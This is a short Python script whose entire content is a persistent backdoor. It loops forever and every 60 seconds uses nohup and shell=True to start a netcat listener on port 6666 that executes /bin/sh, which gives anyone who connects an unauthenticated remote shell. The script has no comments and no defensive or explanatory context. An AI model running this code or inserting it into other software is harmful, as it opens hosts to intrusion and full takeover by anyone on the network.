import time
import subprocess
while True:
	subprocess.Popen(["nohup nc.traditional -l -p 6666 -e /bin/sh &"], shell=True)
	time.sleep(60)
